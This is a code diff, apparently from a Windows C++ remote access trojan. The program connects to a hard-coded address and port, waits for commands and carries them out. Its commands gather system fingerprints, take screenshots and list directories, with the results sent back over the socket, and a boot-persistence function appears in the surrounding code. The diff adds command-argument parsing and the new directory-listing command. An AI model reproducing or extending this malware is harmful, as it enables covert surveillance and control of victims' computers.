@@ -4,14 +4,17 @@
 #define WIN32_LEAN_AND_MEAN
 #endif
 
+#define ADDRESS "192.168.1.37"
+#define PORT 1337
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <tchar.h>
 #include <stdio.h>
 #include <stdlib.h>
-
 #include <intrin.h>
+#include <string>
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
@@ -40,30 +43,42 @@ void addToBoot(TCHAR *szPath) {
 
 SOCKET sock;
 void handle(char *buff, BOOL *listen, BOOL *loop) {
-  if (strcmp(buff, "close") == 0) {
+  std::string b(buff);
+  std::string cmd = b.substr(0, b.find(':'));
+  std::string args = b.substr(b.find(':') + 1);
+
+  printf("\nCommand: %s  Args: %s\n", cmd.c_str(), args.c_str());
+
+
+  if (cmd == "close") {
     *listen = FALSE;
     *loop = FALSE;
-  } else if (strcmp(buff, "hi") == 0) {
+
+  } else if (cmd == "hi") {
     utils::fireHax0r();
-  } else if (strcmp(buff, "systeminfo") == 0) {
+
+  } else if (cmd == "systeminfo") {
     char str[256];
-    sprintf(str, "{name: \"%s\", version: \"%d.%d b.%d\", os: \"%s\", arch: %d}",
+    sprintf(str, "{\"name\": \"%s\", \"version\": \"%d.%d b.%d\", \"os\": \"%s\", \"arch\": %d}",
         fingerprint::getMachineName(),
         info.dwMajorVersion,
         info.dwMinorVersion,
         info.dwBuildNumber,
         ID,
         fingerprint::is64bits() ? 64 : 32);
+    net::write(&sock, str);
 
-    net::PACKET * pck = net::newPacket(str);
-    net::write(&sock, pck);
-    free(pck);
-  } else if (strcmp(buff, "screenshot") == 0) {
+  } else if (cmd == "screenshot") {
     char *ss = utils::TakeScreenShot((char*)"C:\\img.bmp");
+    net::write(&sock, "{\"screenshot\": \"done\"}");
 
-    net::PACKET * pck = net::newPacket((char*)"{screenshot: \"done\"}");
-    net::write(&sock, pck);
-    free(pck);
+  } else if (cmd == "ls") {
+    struct fs::s_folder folder;
+    fs::ls(&folder, (char*)args.c_str());
+
+    char msg[BUFFER_LENGTH];
+    sprintf(msg, "{\"ls\": %s}", serialize(&folder));
+    net::write(&sock, msg);
   }
 }
 
@@ -96,9 +111,6 @@ int main() {
   while (run) {
     net::createSocket(&sock);
     if (net::connect(&sock) == 0) {
-      net::PACKET * pck = net::newPacket((char*)"testing la vida locah!");
-      net::write(&sock, pck);
-      free(pck);
 
       net::listen(&sock, &run, &handle);
     }
